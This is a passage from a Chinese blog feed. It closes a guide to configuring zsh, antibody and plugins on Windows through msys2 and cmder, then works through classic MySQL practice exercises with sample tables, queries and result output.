class="line">pwd</span><br></pre></td></tr></table></figure><p>看看现在的效果。我们现在要做的是，将cmder的就家目录和windows的家目录结合在一起：</p><p>不过在此之前先安装一下zsh:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pacman -S zsh</span><br></pre></td></tr></table></figure><p>好，现在我们正式来做这个任务：</p><p><img data-src="https://pic.downk.cc/item/5e6f8ceee83c3a1e3a9b1529.jpg"><br>修改第6出的命令为：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set MSYSTEM=MINGW64 &amp; set MSYSCON=conemu64.exe &amp; set MSYS2_PATH_TYPE=inherit &amp; set CHERE_INVOKING=1  &amp; set &quot;HOME=C:\Users\Raven&quot; &amp; &quot;%ConEmuDir%\..\..\..\msys64\usr\bin\zsh.exe&quot; --login -i -new_console:n</span><br></pre></td></tr></table></figure><p>修改 <code>set &quot;HOME=C:\Users\Raven&quot;</code>为你的家目录即可。</p><h3 id="2-4-安装-antibody"><a href="#2-4-安装-antibody" class="headerlink" title="2.4 安装 antibody"></a>2.4 <strong>安装 antibody</strong></h3><p>将在前面下好的antibody放到 msys2的usr/bin目录下（其实放到任意Path可识别的环境变量中就好），如我的就是：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\msys64\usr\bin</span><br></pre></td></tr></table></figure><p>现在就可以创建.zshrc文件来配置自己的终端了，</p><p>执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.zshrc # 如果你不熟悉vim，在家目录下创建.zshrc手动打开就好</span><br></pre></td></tr></table></figure><p>我的配置如下:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Created by newuser <span class="keyword">for</span> 5.8</span></span><br><span class="line">autoload -Uz compinit</span><br><span class="line">compinit</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> prompt config</span></span><br><span class="line">export AGKOZAK_PROMPT_DIRTRIM=10</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="built_in">export</span> AGKOZAK_MULTILINE=0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Load antibody</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">export</span> ANTIBODY_HOME=/c/Users/hacklog/.antibody</span></span><br><span class="line">source &lt;(antibody init)</span><br><span class="line">antibody bundle &lt; ~/.zsh_plugins.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[ -e ~/.zsh_alias ] &amp;&amp; source ~/.zsh_alias</span><br><span class="line">[ -e ~/.zsh_compatible ] &amp;&amp; source ~/.zsh_compatible</span><br></pre></td></tr></table></figure><p> <strong>.zsh_alias</strong>配置内容如下:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">alias less=&#x27;less -r&#x27;                          # raw control characters</span><br><span class="line">alias whence=&#x27;type -a&#x27;                        # where, of a sort</span><br><span class="line">alias grep=&#x27;grep --color&#x27;                     # show differences in colour</span><br><span class="line">alias egrep=&#x27;egrep --color=auto&#x27;              # show differences in colour</span><br><span class="line">alias fgrep=&#x27;fgrep --color=auto&#x27;              # show differences in colour</span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Some shortcuts <span class="keyword">for</span> different directory listings</span></span><br><span class="line">alias ls=&#x27;ls -hF --color=tty&#x27;                 # classify files in colour</span><br><span class="line">alias dir=&#x27;ls --color=auto --format=vertical&#x27;</span><br><span class="line">alias ll=&#x27;ls -l&#x27;                              # long list</span><br><span class="line">alias l=&#x27;ls -CF&#x27;                              #</span><br></pre></td></tr></table></figure><p>下面重点来了，配置zsh的插件：</p><p>打开.zsh_plugins.txt文件，这里我给个sample:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#oh my zsh 的插件，配置方法</span><br><span class="line"># robbyrussell&#x2F;oh-my-zsh path:plugins&#x2F; 这里写插件名</span><br><span class="line"># https:&#x2F;&#x2F;github.com&#x2F;ohmyzsh&#x2F;ohmyzsh&#x2F;tree&#x2F;master&#x2F;plugins&#x2F;git</span><br><span class="line">robbyrussell&#x2F;oh-my-zsh path:plugins&#x2F;git</span><br><span class="line"># https:&#x2F;&#x2F;github.com&#x2F;ohmyzsh&#x2F;ohmyzsh&#x2F;tree&#x2F;master&#x2F;plugins&#x2F;z</span><br><span class="line">robbyrussell&#x2F;oh-my-zsh path:plugins&#x2F;z</span><br><span class="line"></span><br><span class="line">#zsh的插件，配置方法</span><br><span class="line">#zsh-users&#x2F;插件名</span><br><span class="line">zsh-users&#x2F;zsh-autosuggestions# 自动提示</span><br><span class="line">zsh-users&#x2F;zsh-syntax-highlighting# 高亮</span><br><span class="line">zsh-users&#x2F;zsh-completions# 补全</span><br></pre></td></tr></table></figure><p>然后source ~/.zshrc即可，可能会卡住，这个没关系，因为它需要下载这些插件。</p><p>现在就可以愉快的在windows上使用zsh+pacman了。</p>]]></content>
      
      
      <categories>
          
          <category> 杂文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cmder </tag>
            
            <tag> on-my-zsh </tag>
            
            <tag> msys2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL练习题</title>
      <link href="/archives/780c7923.html"/>
      <url>/archives/780c7923.html</url>
      
        <content type="html"><![CDATA[<p>最近学了SQL基础，做点题练练手，</p><p>转载自：</p><p>-<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3BhdWwwMTI3L2FydGljbGUvZGV0YWlscy84MjUyOTIxNg==" title="https://blog.csdn.net/paul0127/article/details/82529216">经典SQL练习题(MySQL版)<i class="fa fa-external-link"></i></span></p><a id="more"></a><p>网上有一篇关于SQL的经典文章，<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZseWNhdDI5Ni9hcnRpY2xlL2RldGFpbHMvNjM2ODEwODk=" title="https://blog.csdn.net/flycat296/article/details/63681089">超经典SQL练习题，做完这些你的SQL就过关了<i class="fa fa-external-link"></i></span>，引用和分析它的人很多，于是今天复习SQL的时候找来练了练手。原作者用的是SQL Server 2008，我在这里用的是MySQL 8.0.11（二者语法差别不大），文本编辑器用的是Atom 1.28.2（不知道大家用什么，反正用Atom写SQL确实丝质顺滑）。</p><p>笔者个人推荐DataGrip，可能是对jetbrain家的产品产生了依赖，还是觉得非常好用。</p><p>题目顺序和原文一致，但是我没有把所有题目都解一遍，因为很多题目是重复的。在每道题题目下我除了放SQL语句外，还把MySQL的运行输出结果放了上来，展示效果更直观一些。另外，因为数据量非常小，所以就没考虑SQL语句的性能优化，只求顺利完成题目，并尽可能写得简单些。</p><p>开始之前，先从<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vZGlmZnJlbnQvcC84ODU0OTk1Lmh0bWw=" title="https://www.cnblogs.com/diffrent/p/8854995.html">SQL常见的一些面试题(太有用啦)<i class="fa fa-external-link"></i></span>搬运几道我认为很不错的经典题目过来，这些题目的解法体现出来的方法和思路可以适用于本文的绝大部分题目，是必备的基础。</p><p><strong>1. 用一条SQL 语句 查询出每门课都大于80 分的学生姓名</strong></p><p>name   course grade<br> 张三    语文       81<br> 张三     数学       75<br> 李四     语文       76<br> 李四     数学       90<br> 王五     语文       81<br> 王五     数学       100<br> 王五     英语       90</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">name</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">name</span> <span class="keyword">having</span> <span class="keyword">min</span>(grade) &gt; <span class="number">80</span></span><br></pre></td></tr></table></figure><p><strong>2. 现有学生表如下:</strong><br> 自动编号   学号   姓名 课程编号 课程名称 分数<br> 1        2005001 张三 0001     数学    69<br> 2        2005002 李四 0001      数学    89<br> 3        2005001 张三 0001      数学    69<br> <strong>删除除了自动编号不同, 其他都相同的学生冗余信息</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> tablename <span class="keyword">where</span> 自动编号 <span class="keyword">not</span> <span class="keyword">in</span> (</span><br><span class="line">    <span class="keyword">select</span> <span class="keyword">min</span>( 自动编号) </span><br><span class="line">    <span class="keyword">from</span> tablename </span><br><span class="line">    <span class="keyword">group</span> <span class="keyword">by</span> 学号, 姓名, 课程编号, 课程名称, 分数</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p><strong>3. 一个叫 team 的表，里面只有一个字段name, 一共有4 条纪录，分别是a,b,c,d, 对应四个球对，现在四个球对进行比赛，用一条sql 语句显示所有可能的比赛组合</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">select</span> <span class="selector-tag">a</span><span class="selector-class">.name</span>, <span class="selector-tag">b</span><span class="selector-class">.name</span></span><br><span class="line"><span class="selector-tag">from</span> <span class="selector-tag">team</span> <span class="selector-tag">a</span>, <span class="selector-tag">team</span> <span class="selector-tag">b</span> </span><br><span class="line"><span class="selector-tag">where</span> <span class="selector-tag">a</span><span class="selector-class">.name</span> &lt; <span class="selector-tag">b</span><span class="selector-class">.name</span></span><br></pre></td></tr></table></figure><p><strong>4. 请用SQL 语句实现：从TestDB 数据表中查询出所有月份的发生额都比101 科目相应月份的发生额高的科目。</strong><br> 请注意：TestDB 中有很多科目，都有1~12月份的发生额。<br> AccID ：科目代码，Occmonth ：发生额月份，DebitOccur ：发生额。<br> 数据库名：JcyAudit ，数据集：Select * from TestDB</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> a.*</span><br><span class="line"><span class="keyword">from</span> TestDB a, </span><br><span class="line">    (<span class="keyword">select</span> Occmonth, <span class="keyword">max</span>(DebitOccur) <span class="keyword">as</span> Debit101ccur </span><br><span class="line">    <span class="keyword">from</span> TestDB </span><br><span class="line">    <span class="keyword">where</span> AccID=<span class="string">&#x27;101&#x27;</span> </span><br><span class="line">    <span class="keyword">group</span> <span class="keyword">by</span> Occmonth) b</span><br><span class="line"><span class="keyword">where</span> a.Occmonth = b.Occmonth <span class="keyword">and</span> a.DebitOccur &gt; b.Debit101ccur</span><br></pre></td></tr></table></figure><p><strong>5. 怎么把这样一个数据表</strong><br> year   month amount<br> 1991   1     1.1<br> 1991   2     1.2<br> 1991   3     1.3<br> 1991   4     1.4<br> 1992   1     2.1<br> 1992   2     2.2<br> 1992   3     2.3<br> 1992   4     2.4<br> <strong>查成这样一个结果？</strong><br> year m1   m2   m3   m4<br> 1991 1.1 1.2 1.3 1.4<br> 1992 2.1 2.2 2.3 2.4</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">year</span>, </span><br><span class="line">    (<span class="keyword">select</span> amount <span class="keyword">from</span> <span class="keyword">table</span> m <span class="keyword">where</span> <span class="keyword">month</span>=<span class="number">1</span> <span class="keyword">and</span> m.year=table.year) <span class="keyword">as</span> m1,</span><br><span class="line">    (<span class="keyword">select</span> amount <span class="keyword">from</span> <span class="keyword">table</span> m <span class="keyword">where</span> <span class="keyword">month</span>=<span class="number">2</span> <span class="keyword">and</span> m.year=table.year) <span class="keyword">as</span> m2,</span><br><span class="line">    (<span class="keyword">select</span> amount <span class="keyword">from</span> <span class="keyword">table</span> m <span class="keyword">where</span> <span class="keyword">month</span>=<span class="number">3</span> <span class="keyword">and</span> m.year=table.year) <span class="keyword">as</span> m3,</span><br><span class="line">    (<span class="keyword">select</span> amount <span class="keyword">from</span> <span class="keyword">table</span> m <span class="keyword">where</span> <span class="keyword">month</span>=<span class="number">4</span> <span class="keyword">and</span> m.year=table.year) <span class="keyword">as</span> m4</span><br><span class="line"><span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">year</span></span><br></pre></td></tr></table></figure><p><strong>6. 有表A，结构如下：</strong><br> p_ID p_Num s_id<br> 1 10 01<br> 1 12 02<br> 2 8 01<br> 3 11 01<br> 3 8 03<br> 其中：p_ID为产品ID，p_Num为产品库存量，s_id为仓库ID。<br> <strong>请用SQL语句实现将上表中的数据合并，合并后的数据为：</strong><br> p_ID s1_id s2_id s3_id<br> 1 10 12 0<br> 2 8 0 0<br> 3 11 0 8<br> 其中：s1_id为仓库1的库存量，s2_id为仓库2的库存量，s3_id为仓库3的库存量。如果该产品在某仓库中无库存量，那么就是0代替。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> p_id,</span><br><span class="line">    <span class="keyword">sum</span>(<span class="keyword">case</span> <span class="keyword">when</span> s_id=<span class="number">1</span> <span class="keyword">then</span> p_num <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>) <span class="keyword">as</span> s1_id,</span><br><span class="line">    <span class="keyword">sum</span>(<span class="keyword">case</span> <span class="keyword">when</span> s_id=<span class="number">2</span> <span class="keyword">then</span> p_num <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>) <span class="keyword">as</span> s2_id,</span><br><span class="line">    <span class="keyword">sum</span>(<span class="keyword">case</span> <span class="keyword">when</span> s_id=<span class="number">3</span> <span class="keyword">then</span> p_num <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>) <span class="keyword">as</span> s3_id</span><br><span class="line"><span class="keyword">from</span> myPro <span class="keyword">group</span> <span class="keyword">by</span> p_id</span><br></pre></td></tr></table></figure><hr><p>下面进入正题。首先创建数据表：</p><p><strong>学生表 Student</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> Student(<span class="keyword">Sid</span> <span class="built_in">varchar</span>(<span class="number">6</span>), Sname <span class="built_in">varchar</span>(<span class="number">10</span>), Sage datetime, Ssex <span class="built_in">varchar</span>(<span class="number">10</span>));</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Student <span class="keyword">values</span>(<span class="string">&#x27;01&#x27;</span> , <span class="string">&#x27;赵雷&#x27;</span> , <span class="string">&#x27;1990-01-01&#x27;</span> , <span class="string">&#x27;男&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Student <span class="keyword">values</span>(<span class="string">&#x27;02&#x27;</span> , <span class="string">&#x27;钱电&#x27;</span> , <span class="string">&#x27;1990-12-21&#x27;</span> , <span class="string">&#x27;男&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Student <span class="keyword">values</span>(<span class="string">&#x27;03&#x27;</span> , <span class="string">&#x27;孙风&#x27;</span> , <span class="string">&#x27;1990-05-20&#x27;</span> , <span class="string">&#x27;男&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Student <span class="keyword">values</span>(<span class="string">&#x27;04&#x27;</span> , <span class="string">&#x27;李云&#x27;</span> , <span class="string">&#x27;1990-08-06&#x27;</span> , <span class="string">&#x27;男&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Student <span class="keyword">values</span>(<span class="string">&#x27;05&#x27;</span> , <span class="string">&#x27;周梅&#x27;</span> , <span class="string">&#x27;1991-12-01&#x27;</span> , <span class="string">&#x27;女&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Student <span class="keyword">values</span>(<span class="string">&#x27;06&#x27;</span> , <span class="string">&#x27;吴兰&#x27;</span> , <span class="string">&#x27;1992-03-01&#x27;</span> , <span class="string">&#x27;女&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Student <span class="keyword">values</span>(<span class="string">&#x27;07&#x27;</span> , <span class="string">&#x27;郑竹&#x27;</span> , <span class="string">&#x27;1989-07-01&#x27;</span> , <span class="string">&#x27;女&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Student <span class="keyword">values</span>(<span class="string">&#x27;08&#x27;</span> , <span class="string">&#x27;王菊&#x27;</span> , <span class="string">&#x27;1990-01-20&#x27;</span> , <span class="string">&#x27;女&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>成绩表 SC</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> SC(<span class="keyword">Sid</span> <span class="built_in">varchar</span>(<span class="number">10</span>), Cid <span class="built_in">varchar</span>(<span class="number">10</span>), score <span class="built_in">decimal</span>(<span class="number">18</span>,<span class="number">1</span>));</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> SC <span class="keyword">values</span>(<span class="string">&#x27;01&#x27;</span> , <span class="string">&#x27;01&#x27;</span> , <span class="number">80</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> SC <span class="keyword">values</span>(<span class="string">&#x27;01&#x27;</span> , <span class="string">&#x27;02&#x27;</span> , <span class="number">90</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> SC <span class="keyword">values</span>(<span class="string">&#x27;01&#x27;</span> , <span class="string">&#x27;03&#x27;</span> , <span class="number">99</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> SC <span class="keyword">values</span>(<span class="string">&#x27;02&#x27;</span> , <span class="string">&#x27;01&#x27;</span> , <span class="number">70</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> SC <span class="keyword">values</span>(<span class="string">&#x27;02&#x27;</span> , <span class="string">&#x27;02&#x27;</span> , <span class="number">60</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> SC <span class="keyword">values</span>(<span class="string">&#x27;02&#x27;</span> , <span class="string">&#x27;03&#x27;</span> , <span class="number">80</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> SC <span class="keyword">values</span>(<span class="string">&#x27;03&#x27;</span> , <span class="string">&#x27;01&#x27;</span> , <span class="number">80</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> SC <span class="keyword">values</span>(<span class="string">&#x27;03&#x27;</span> , <span class="string">&#x27;02&#x27;</span> , <span class="number">80</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> SC <span class="keyword">values</span>(<span class="string">&#x27;03&#x27;</span> , <span class="string">&#x27;03&#x27;</span> , <span class="number">80</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> SC <span class="keyword">values</span>(<span class="string">&#x27;04&#x27;</span> , <span class="string">&#x27;01&#x27;</span> , <span class="number">50</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> SC <span class="keyword">values</span>(<span class="string">&#x27;04&#x27;</span> , <span class="string">&#x27;02&#x27;</span> , <span class="number">30</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> SC <span class="keyword">values</span>(<span class="string">&#x27;04&#x27;</span> , <span class="string">&#x27;03&#x27;</span> , <span class="number">20</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> SC <span class="keyword">values</span>(<span class="string">&#x27;05&#x27;</span> , <span class="string">&#x27;01&#x27;</span> , <span class="number">76</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> SC <span class="keyword">values</span>(<span class="string">&#x27;05&#x27;</span> , <span class="string">&#x27;02&#x27;</span> , <span class="number">87</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> SC <span class="keyword">values</span>(<span class="string">&#x27;06&#x27;</span> , <span class="string">&#x27;01&#x27;</span> , <span class="number">31</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> SC <span class="keyword">values</span>(<span class="string">&#x27;06&#x27;</span> , <span class="string">&#x27;03&#x27;</span> , <span class="number">34</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> SC <span class="keyword">values</span>(<span class="string">&#x27;07&#x27;</span> , <span class="string">&#x27;02&#x27;</span> , <span class="number">89</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> SC <span class="keyword">values</span>(<span class="string">&#x27;07&#x27;</span> , <span class="string">&#x27;03&#x27;</span> , <span class="number">98</span>)</span><br></pre></td></tr></table></figure><p><strong>课程表 Course</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> Course(Cid <span class="built_in">varchar</span>(<span class="number">10</span>),Cname <span class="built_in">varchar</span>(<span class="number">10</span>),Tid <span class="built_in">varchar</span>(<span class="number">10</span>));</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Course <span class="keyword">values</span>(<span class="string">&#x27;01&#x27;</span> , <span class="string">&#x27;语文&#x27;</span> , <span class="string">&#x27;02&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Course <span class="keyword">values</span>(<span class="string">&#x27;02&#x27;</span> , <span class="string">&#x27;数学&#x27;</span> , <span class="string">&#x27;01&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Course <span class="keyword">values</span>(<span class="string">&#x27;03&#x27;</span> , <span class="string">&#x27;英语&#x27;</span> , <span class="string">&#x27;03&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>教师表 Teacher</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> Teacher(Tid <span class="built_in">varchar</span>(<span class="number">10</span>),Tname <span class="built_in">varchar</span>(<span class="number">10</span>));</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Teacher <span class="keyword">values</span>(<span class="string">&#x27;01&#x27;</span> , <span class="string">&#x27;张三&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Teacher <span class="keyword">values</span>(<span class="string">&#x27;02&#x27;</span> , <span class="string">&#x27;李四&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Teacher <span class="keyword">values</span>(<span class="string">&#x27;03&#x27;</span> , <span class="string">&#x27;王五&#x27;</span>)</span><br></pre></td></tr></table></figure><p>四张表之间的关联很简单：</p><p><img data-src="https://i.loli.net/2020/03/17/ru3wo47ezKvGdaO.png" alt="image-20200317113350723"></p><p>表格关联</p><p>（以下题目的顺序和原文相对应）</p><p><strong>1. 查询” 01 “课程比” 02 “课程成绩高的学生的信息及课程分数</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> s.*, a.score <span class="keyword">as</span> score_01, b.score <span class="keyword">as</span> score_02</span><br><span class="line"><span class="keyword">from</span> student s,</span><br><span class="line">     (<span class="keyword">select</span> <span class="keyword">sid</span>, score <span class="keyword">from</span> sc <span class="keyword">where</span> cid=<span class="number">01</span>) a,</span><br><span class="line">     (<span class="keyword">select</span> <span class="keyword">sid</span>, score <span class="keyword">from</span> sc <span class="keyword">where</span> cid=<span class="number">02</span>) b</span><br><span class="line"><span class="keyword">where</span> a.sid = b.sid <span class="keyword">and</span> a.score &gt; b.score <span class="keyword">and</span> s.sid = a.sid</span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+------+--------+---------------------+------+----------+----------+</span><br><span class="line"><span class="params">| Sid  |</span> Sname  <span class="params">| Sage                |</span> Ssex <span class="params">| score_01 |</span> score_02 <span class="params">|</span></span><br><span class="line"><span class="params">+------+--------+---------------------+------+----------+----------+</span></span><br><span class="line"><span class="params">|</span> <span class="number">02</span>   <span class="params">| 钱电   |</span> <span class="number">1990</span>-<span class="number">12</span>-<span class="number">21</span> <span class="number">00</span><span class="symbol">:</span><span class="number">00</span><span class="symbol">:</span><span class="number">00</span> <span class="params">| 男   |</span>     <span class="number">70.0</span> <span class="params">|     60.0 |</span></span><br><span class="line"><span class="params">| 04   |</span> 李云   <span class="params">| 1990-08-06 00:00:00 |</span> 男   <span class="params">|     50.0 |</span>     <span class="number">30.0</span> <span class="params">|</span></span><br><span class="line"><span class="params">+------+--------+---------------------+------+----------+----------+</span></span><br><span class="line"><span class="params">2 rows <span class="keyword">in</span> set (0.00 sec)</span></span><br></pre></td></tr></table></figure><p><strong>2. 查询平均成绩大于等于 60 分的同学的学生编号和学生姓名和平均成绩</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> s.sid, sname, <span class="keyword">avg</span>(score) <span class="keyword">as</span> avg_score</span><br><span class="line"><span class="keyword">from</span> student <span class="keyword">as</span> s, sc</span><br><span class="line"><span class="keyword">where</span> s.sid = sc.sid</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> s.sid</span><br><span class="line"><span class="keyword">having</span> avg_score &gt; <span class="number">60</span></span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">+------+--------+-----------+</span><br><span class="line"><span class="params">| sid  |</span> sname  <span class="params">| avg_score |</span></span><br><span class="line">+------+--------+-----------+</span><br><span class="line"><span class="params">| 01   |</span> 赵雷   <span class="params">|  89.66667 |</span></span><br><span class="line"><span class="params">| 02   |</span> 钱电   <span class="params">|  70.00000 |</span></span><br><span class="line"><span class="params">| 03   |</span> 孙风   <span class="params">|  80.00000 |</span></span><br><span class="line"><span class="params">| 05   |</span> 周梅   <span class="params">|  81.50000 |</span></span><br><span class="line"><span class="params">| 07   |</span> 郑竹   <span class="params">|  93.50000 |</span></span><br><span class="line">+------+--------+-----------+</span><br><span class="line"><span class="number">5</span> rows <span class="keyword">in</span> set (<span class="number">0</span>.<span class="number">00</span> sec)</span><br></pre></td></tr></table></figure><p><strong>3. 查询在 SC 表存在成绩的学生信息</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> <span class="keyword">sid</span> <span class="keyword">in</span> (<span class="keyword">select</span> <span class="keyword">sid</span> <span class="keyword">from</span> sc <span class="keyword">where</span> score <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">null</span>)</span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 